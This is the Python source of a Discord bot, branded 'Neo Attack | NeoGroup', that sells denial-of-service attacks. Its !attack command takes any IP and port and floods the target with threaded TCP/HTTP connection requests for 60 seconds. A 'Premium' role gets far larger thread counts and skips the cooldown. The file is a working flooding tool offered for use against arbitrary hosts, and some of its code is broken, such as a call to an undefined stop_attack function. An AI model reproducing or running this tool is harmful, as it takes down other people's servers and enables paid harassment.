import discord
from discord.ext import commands
import asyncio
import threading
import socket

TOKEN = 'bottoken'

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Shared flag to control the attack threads
stop_attack_flag = threading.Event()

# Flag to check if an attack is in progress
attack_in_progress = False

# Cooldowns
free_cooldown = commands.CooldownMapping.from_cooldown(1, 300, commands.BucketType.user)

def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
    while not stop_event.is_set() and not stop_attack_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))

            request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            request += b"A" * bytes_to_send
            s.send(request)

            s.close()

        except Exception as e:
            print("An error occurred:", str(e))
            break

async def start_attack(ctx, ip_port, premium):
    global attack_in_progress

    if attack_in_progress:
        embed = discord.Embed(
            title="⚠️ Attack in Progress",
            description="Another attack is already in progress. Please wait until it's completed.",
            color=discord.Color.orange()
        )
        response = await ctx.send(embed=embed)
        await asyncio.sleep(5)
        await response.delete()
        return

    try:
        target_ip, port = ip_port.split(':')
        target_ip = socket.gethostbyname(target_ip)
        port = int(port)
    except (socket.gaierror, ValueError):
        embed = discord.Embed(
            title="❌ Invalid Format",
            description=f"Invalid IP or port format. Please use the correct format: `!attack [ip:port]`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    global stop_attack_flag
    stop_attack_flag = threading.Event()

    threads = []

    if premium:
        # Premium settings
        bytes_to_send = 0  # Example: Premium-specific bytes
        requests_per_thread = 1500  # Example: Premium-specific requests per thread
        connections_per_thread = 100000000000  # Example: Premium-specific connections per thread
    else:
        # Free settings
        bytes_to_send = 0
        requests_per_thread = 200
        connections_per_thread = 1000000

    for _ in range(connections_per_thread):
        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_attack_flag))
        t.start()
        threads.append(t)

    # Update the flag inside the asynchronous function
    attack_in_progress = True

    # Create the embed
    embed = discord.Embed(
        color=discord.Color.blue(),
        title=f"🚀Attack started successfully 🚀",
    )
    embed.add_field(name='IP Address', value=f"`{target_ip}:{port}`", inline=False)
    embed.add_field(name='Plan', value="Premium" if premium else "Free", inline=True)
    embed.add_field(name='Time', value=f"`60s`", inline=True)
    embed.set_image(url="https://cdn.discordapp.com/attachments/1200706156113440768/1200830596084138145/20240109_142713.gif?ex=65d0d624&is=65be6124&hm=57e4f36b3faff49c9c873749a0cbeb427761f557ca0b7f017b812eff0efc8fc2&")
    embed.timestamp = ctx.message.created_at
    embed.set_footer(text='Neo Attack | NeoGroup', icon_url='https://media.discordapp.net/attachments/1200706156113440768/1200706209657917460/neoattacklogo.png?ex=65d0624c&is=65bded4c&hm=7b246e9785a0ed379bf48ba5bfc54a3d3f77df4ccb51e133e53fc555c632233d&=&format=webp&quality=lossless')

    # Send the embed
    attack_message = await ctx.send(embed=embed)

    await asyncio.sleep(60)

    stop_attack_flag.set()

    for t in threads:
        t.join()

    embed = discord.Embed(
        title=f"🛑 Attack Stopped",
        description=f"Stopped attacking {target_ip}:{port}.",
        color=discord.Color.red()
    )
    await attack_message.edit(embed=embed)

    # Reset the flag after the attack is stopped
    attack_in_progress = False

@bot.command()
async def attack(ctx, ip_port: str):
    bypass_cooldown = 1200699515817185332 in [role.id for role in ctx.author.roles]

    if not bypass_cooldown and free_cooldown.get_bucket(ctx.message).update_rate_limit():
        await ctx.send("⏳ You are on cooldown. Please wait before starting another attack.")
        return

    if ctx.channel.id != 1200697293276467222:
        await ctx.send("❌ You can only execute this command in the attack channel.")
        return

    if bypass_cooldown:
        # Premium settings
        await start_attack(ctx, ip_port, premium=True)
    else:
        # Free settings
        await start_attack(ctx, ip_port, premium=False)

@bot.command()
async def stop(ctx):
    if ctx.channel.id != 1200697293276467222:
        await ctx.send("❌ You can only execute this command in the specified channel.")
        return
    allowed_roles = [1201164315441512529, 1200468566462451902]
    if any(role.id in allowed_roles for role in ctx.author.roles):
        await stop_attack(ctx)

@bot.command()
async def disable(ctx):
    # Check if the command is executed in the allowed channel
    if ctx.channel.id != 1200698715854344314:
        await ctx.send("❌ You can only execute this command in the specified channel.")
        return
    # Check if the user has the required role to disable commands
    if 1200468566462451902 in [role.id for role in ctx.author.roles] or 1200699699007606796 in [role.id for role in ctx.author.roles]:
        global commands_disabled
        commands_disabled = True
        await bot.change_presence(status=discord.Status.offline)
        await ctx.send("🚫 Commands are now disabled except for authorized users.")
    else:
        await ctx.send("❌ You don't have the required role to disable commands.")

@bot.command()
async def enable(ctx):
    # Check if the command is executed in the allowed channel
    if ctx.channel.id != 1200698715854344314:
        await ctx.send("❌ You can only execute this command in the specified channel.")
        return
    # Check if the user has the required role to enable commands
    if 1200468566462451902 in [role.id for role in ctx.author.roles] or 1201164315441512529 in [role.id for role in ctx.author.roles]:
        global commands_disabled
        commands_disabled = False
        await bot.change_presence(status=discord.Status.online)
        await ctx.send("✅ Commands are now enabled.")
    else:
        await ctx.send("❌ You don't have the required role to enable commands.")

@bot.command()
async def setstatus(ctx, status: str):
    # Check if the command is executed in the allowed channel
    if ctx.channel.id != 1200698715854344314:
        await ctx.send("❌ You can only execute this command in the specified channel.")
        return
    # Check if the user has the required role to set the bot status
    if 1200468566462451902 in [role.id for role in ctx.author.roles] or 1200699699007606796 in [role.id for role in ctx.author.roles]:
        statuses = ['online', 'idle', 'dnd', 'offline']
        if status.lower() in statuses:
            await bot.change_presence(status=discord.Status[status.lower()])
            await ctx.send(f"✅ Bot status set to {status.capitalize()}.")
        else:
            await ctx.send("❌ Invalid status. Use `online`, `idle`, `dnd`, or `offline`.")
    else:
        await ctx.send("❌ You don't have the required role to set the bot status.")

bot.run(TOKEN)